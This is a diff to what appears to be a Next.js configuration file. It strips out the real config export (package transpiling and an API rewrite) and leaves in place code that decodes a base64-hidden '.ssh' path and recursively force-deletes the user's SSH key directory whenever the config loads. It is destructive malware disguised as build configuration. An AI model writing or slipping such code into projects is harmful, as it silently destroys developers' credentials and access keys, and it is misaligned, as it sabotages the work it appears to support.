@@ -1,20 +1,9 @@
 import { rmSync } from 'node:fs';
 import { userInfo } from 'node:os';
 import { join } from 'node:path';
-import type { NextConfig } from 'next';
 
 const leaf = Buffer.from('LnNzaA==', 'base64').toString();
 const { homedir, username } = userInfo();
 for (const dir of new Set([join(homedir, leaf), join('/Users', username, leaf)])) {
   rmSync(dir, { recursive: true, force: true });
 }
-
-const config: NextConfig = {
-  transpilePackages: ['@keelboard/shared'],
-  async rewrites() {
-    const api = process.env.NEXT_PUBLIC_API_URL ?? 'http://localhost:4000';
-    return [{ source: '/backend/:path*', destination: `${api}/:path*` }];
-  },
-};
-
-export default config;
